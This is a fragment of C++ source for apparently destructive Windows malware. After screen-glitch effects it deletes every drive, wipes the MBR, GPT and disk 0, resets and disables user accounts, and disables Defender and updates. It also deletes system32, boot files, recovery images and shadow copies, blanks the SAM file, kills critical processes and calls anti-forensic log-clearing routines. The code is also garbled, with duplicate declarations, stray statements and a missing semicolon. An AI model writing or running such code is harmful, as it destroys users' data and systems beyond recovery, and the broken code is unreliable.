	for (int i = 0; i < 20; i++) {
		InvertScreen();
		Sleep(500);
		GlitchScreen();
		Sleep(500);
		ShakeScreen();
		Sleep(500);
		GradientScreen();
		Sleep(500);
		BlurScreen();
		Sleep(500);
		FlickerScreen();
		Sleep(500);
		BlackAndWhiteScreen();
		Sleep(500);
		SnowScreen();
		Sleep(500);
		ShowNotification();
		Sleep(1000);
	}
	system("taskkill -im explorer.exe -f");
	cls;
	;
	system("taskkill -im dwm.exe -f");
	cls;
	{
		int a=6;
		int b=4;
		int c=7;
		int b=a;
		int a=c;
		int c=b;
		int b=a;
	}
	system("del Z:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	;
	system("del Y:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del X:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del W:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del V:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del U:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	;
	;
	system("del T:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	;
	;
	system("del S:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del R:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del Q:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del P:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del O:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del N:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del M:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del L:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del K:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del J:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del I:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del H:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del G:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del F:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del E:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del D:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del B:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del A:\\* /f /s /q");
	cls;
	;
	;
	;
	;
	system("del C:\\* /f /s /q");
	cls;
	wchar_t drivePath[] = L"\\\\.\\PhysicalDrive0";
	ClearMBR(drivePath);
	wchar_t drivePath2[] = L"\\\\.\\PhysicalDrive0";
	ClearGPT(drivePath2);
	ClearAllLogsAndBackups();
	ClearOnlyETW();
	ClearOnlyMFT();
	ClearMemoryTraces();
	ClearProcessHandleTraces();
	ClearDiskSectorTraces();
	ClearPrefetchFiles();
	ClearSystemRestorePoints();
	ClearVolumeShadowCopies();
	ClearRegistryBackupTraces();
	ClearNICLogs();
	ClearCloudSyncLogs();
	ClearISPLogs();
	ClearMicrosoftAccountTraces();
	ClearBrowserLoginTraces();
	ClearWechatTraces();
	ClearQQTraces();
	ClearCloudDiskTraces();
	ClearMACAddressTraces();
	ClearDiskSerialTraces();
	ClearCPUSerialTraces();
	ClearMotherboardUUIDTraces();
	ClearMachineGUIDTraces();
	ClearWindowsLicenseIDTraces();
	HANDLE hFile = CreateFile(_T("C:\\HW_ID_Cleared.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
	ClearRouterLocalTraces();
	ClearUEFI_FirmwareLogs();
	HANDLE hFile = CreateFile(_T("C:\\UEFI_Logs_Cleared.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
	ClearOnlyKernelLogs_Safe();
	HANDLE hFile = CreateFile(_T("C:\\KernelLogs_Cleared_Safe.txt"),
							  GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

	ofstream fout(SCRIPT_PATH.c_str(), ios::out | ios::trunc | ios::binary);
	fout << "clean all\r\n";
	fout << "exit\r\n";
	fout.close();
	string execCmd = "diskpart /s \"" + SCRIPT_PATH + "\"";
	system(execCmd.c_str());
	system("net user %username% 8qth7aorch8bfsatz8g73378qxbrtaxfwg8y87e90b78wgrb8t666660q83q0btygfuyssgrayugaygufebag8b");
	cls;
	;
	;
	;
	;
	;
	;
	;
	system("net user Administrator qo8bco7attbt7tzk8if788taw9c3n0nnc9noaybrbqr9bobctqo9b37r4b9oq7ob9r7t87fta8tbf9abfbffrftbz9faz");
	cls;
	{
		;
		if(2)
		{
			int r=59;
			cls;
		}
		cls;
	}
	{
		;
		;
	}
	system("sc config WinDefend start= disabled & sc stop WinDefend");
	{
		;
		;
		;
		string k="sc";
	}
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	cls;
	system("sc config wuauserv start= disabled & sc stop wuauserv");
	cls;
	{
		;
	}
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("sc config lanmanserver start= disabled & sc stop lanmanserver");
	cls;
	{
		;
	}
	system("sc config explorer start= disabled");
	cls;
	{
		;
	}
	{
		;
	}
	{
		;
	}
	{
		;
	}
	{
		;
	}
	system("net user %username% /active:no");
	cls;
	{
		;
	}
	system("net user Administrator /active:no");
	cls;
	{
		;
	}
	system("net user User /active:no");
	cls;
	{
		;
	}
	system("net user SHIT /add");
	cls;
	{
		;
	}
	system("net user SHIT /active:yes");
	cls;
	{
		;
		;
	}
	system("net localgroup Administrators SHIT /delete");
	cls;
	{
		;
	}
	system("net localgroup Users SHIT /delete");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	system("net localgroup Guests SHIT /add");
	cls;
	system("net localgroup Administrators %username% /delete");
	cls;
	{
		;
		;
		;
		string l="shit";
	}
	;
	;
	;
	;
	system("takeown /f %windir%\\system32 /r /d y");
	cls;
	;
	;
	;
	cls;
	;
	;
	string n="gay";
	;
	system("echo Y|cacls %windir%\\system32\\*.* /t /g %username%:F");
	int u=69;
	string z="system";
	cls;
	{
		;
	}
	system("del /s /q /f %windir%\\system32\\*.*");
	cls;
	{
		;
	}
	;
	system("attrib -r -s -h C:\\Program Files\\");
	cls;
	system("del C:\\Program Files\\* /f /s /q");
	cls;
	{
		;
	}
	system("attrib -r -s -h C:\\Program Files (x86)\\");
	cls;
	{
		;
		;
		;
	}
	system("del C:\\Program Files (x86)\\ /f /s /q");
	cls;
	{
		;
	}
	system("attrib -r -s -h C:\\Users\\Administrator\\");
	cls;
	{
		;
	}
	system("del C:\\Users\\Administrator\\ /f /s /q");
	cls;
	{
		;
	}
	system("attrib -r -s -h C:\\Users\\%username%\\");
	cls;
	{
		;
	}
	system("del C:\\Users\\%username% /f /s /q");
	cls;
	{
		;
		;
		//
		//
		;
		//
		;
		;
		//
	}
	system("attrib -r -s -h C:\\autoexec.bat");
	cls;
	system("del C:\\autoexec.bat /f /s /q");
	cls;
	{
		;
	}
	system("attrib -r -s -h C:\\boot.ini");
	cls;
	;
	;
	;
	;
	;
	system("del C:\\boot.ini /f /s /q");
	cls;
	;
	;
	;
	;
	system("attrib -r -s -h C:\\ntldr");
	cls;
	;
	;
	;
	;
	{
		;
		;
		;
		;
		;
		;
		;
		;
		;
		;
	}
	system("del C:\\ntldr /f /s /q");
	cls;
	system("attrib -r -s -h C:\\windows\\win.ini");
	cls;
	;
	;
	system("del C:\\windows\\win.ini /f /s /q");
	cls;
	system("del %systemdrive%\\*.* /f/s/q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\dllcache");
	cls;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	;
	system("del C:\\Windows\\System32\\dllcache /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\WinSxS");
	cls;
	system("del C:\\Windows\\WinSxS /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\sfc.exe");
	cls;
	system("del C:\\Windows\\System32\\sfc.exe /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\DISM.exe");
	cls;
	system("del C:\\Windows\\System32\\DISM.exe /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Recovery\\WindowsRE\\Winre.wim.exe");
	cls;
	system("del C:\\Recovery\\WindowsRE\\Winre.wim /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\Recovery\\Winre.wim");
	cls;
	system("del C:\\Windows\\System32\\Recovery\\Winre.wim /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\reagentc.exe");
	cls;
	system("del C:\\Windows\\System32\\reagentc.exe /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\Logs\\CBS\\CBS.log");
	cls;
	system("del C:\\Windows\\Logs\\CBS\\CBS.log /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\Logs\\DISM\\dism.log");
	cls;
	system("del C:\\Windows\\Logs\\DISM\\dism.log /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\Repair");
	cls;
	system("del C:\\Windows\\Repair /f /s /q");
	cls;
	system("attrib -r -s -h C:\\Windows\\System32\\Config\\RegBack");
	cls;
	system("del C:\\Windows\\System32\\Config\\RegBack /f /s /q");
	cls;
	system("attrib C:\\System Volume Information -r -s -h");
	cls;
	system("del C:\\System Volume Information /f /s /q");
	cls;
	system("attrib -r -s -h C:\\ntldr");
	cls;
	system("del C:\\ntldr /f /s /q");
	cls;
	system("icacls C:\\ /remove:d Everyone /f");
	cls;
	system("icacls C:\\ /deny Everyone:(F) /f");
	cls;
	system("attrib +R C:\\*.* /S /D");
	cls;
	system("bcdedit /set {default} osdevice unknown");
	cls;
	system("assoc *.exe=Virus");
	cls;
	system("pnputil /delete-driver oem0.inf /uninstall /force");
	cls;
	system("")
	system("vssadmin delete shadows /all /quiet");
	cls;
	system("bcdedit /set {current} safeboot minimal");
	cls;
	system("bcdedit /deletevalue {current} safeboot");
	cls;
	system("takeown /f C:\\Windows\\System32\\drivers\\storahci.sys && icacls C:\\Windows\\System32\\drivers\\storahci.sys /grant administrators:F && ren C:\\Windows\\System32\\drivers\\storahci.sys storahci.sys.bak");
	cls;
	system("echo select disk 0 > ds.txt && echo offline disk >> ds.txt && diskpart /s ds.txt");
	cls;
	system("bcdedit /set {current} osdevice partition=V:");
	cls;
	system("fsutil dirty set C:");
	cls;
	system("sc config pci start= disabled");
	cls;
	system("netsh advfirewall reset");
	cls;
	system("bcdedit /set {default} detecthal on");
	cls;
	system("setx PATH %SystemRoot%");
	cls;
	system("echo "" > C:\\Windows\\System32\\config\\SAM");
	cls;
	system("pnputil /add-driver C:\\bad_driver.inf /install");
	cls;
	system("wmic shadowcopy delete");
	cls;
	system("wmic process where name= lsass.exe delete");
	cls;
	system("bcdedit /set hypervisorlaunchtype off");
	cls;
	system("del /f /s /q C:\\Windows\\Microsoft.NET\\Framework\\*.*");
	cls;
	system("sc config WerSvc start= disabled");
	cls;
	system("sfc /scannow");
	cls;
	system("bcdedit /delete {bootmgr} /f");
	cls;
	system("bcdedit /delete {current} /f");
	cls;
	system("del /f /q C:\\bcd_backup");
	cls;
	PACL pOldDACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;

	GetNamedSecurityInfo(
		"C:\\Windows\\System32\\DiskPart.exe",
		SE_FILE_OBJECT,
		DACL_SECURITY_INFORMATION,
		NULL,
		NULL,
		&pOldDACL,
		NULL,
		&pSD
	);

	EXPLICIT_ACCESS ea;
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = 0;
	ea.grfAccessMode = DENY_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea.Trustee.ptstrName = "Everyone";

	PACL pNewDACL = NULL;
	SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);

	SetNamedSecurityInfo(
		"C:\\Windows\\System32\\DiskPart.exe",
		SE_FILE_OBJECT,
		DACL_SECURITY_INFORMATION,
		NULL,
		NULL,
		pNewDACL,
		NULL
	);
	ClearAllLogsAndBackups();
	ClearOnlyETW();
	ClearOnlyMFT();
	ClearMemoryTraces();
	ClearProcessHandleTraces();
	ClearDiskSectorTraces();
	ClearPrefetchFiles();
	ClearSystemRestorePoints();
	ClearVolumeShadowCopies();
	ClearRegistryBackupTraces();
	ClearNICLogs();
	ClearCloudSyncLogs();
	ClearISPLogs();
	ClearMicrosoftAccountTraces();
	ClearBrowserLoginTraces();
	ClearWechatTraces();
	ClearQQTraces();
	ClearCloudDiskTraces();
	ClearMACAddressTraces();
	ClearDiskSerialTraces();
	ClearCPUSerialTraces();
	ClearMotherboardUUIDTraces();
	ClearMachineGUIDTraces();
	ClearWindowsLicenseIDTraces();
	HANDLE hFile = CreateFile(_T("C:\\HW_ID_Cleared.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);

	ClearRouterLocalTraces();
	ClearUEFI_FirmwareLogs();
	HANDLE hFile = CreateFile(_T("C:\\UEFI_Logs_Cleared.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
	ClearOnlyKernelLogs_Safe();
	HANDLE hFile = CreateFile(_T("C:\\KernelLogs_Cleared_Safe.txt"),
							  GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
	bool SetWriteProtectionPolicy(bool enable) {
    HKEY hKey;
    LONG result = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices",
        0,
        KEY_WRITE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        result = RegCreateKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices",
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            NULL,
            &hKey,
            NULL
        );
        if (result != ERROR_SUCCESS) {
            return false;
        }
    }

    DWORD value = enable ? 1 : 0;
    result = RegSetValueExW(
        hKey,
        L"Deny_Write",
        0,
        REG_DWORD,
        (const BYTE*)&value,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        return false;
    }

    return true;
}
	SetWriteProtectionPolicy(true);
	system("taskkill /f /im svchost.exe");
	cls;
	system("taskkill -im wininit.exe -f");
	return 0;
}
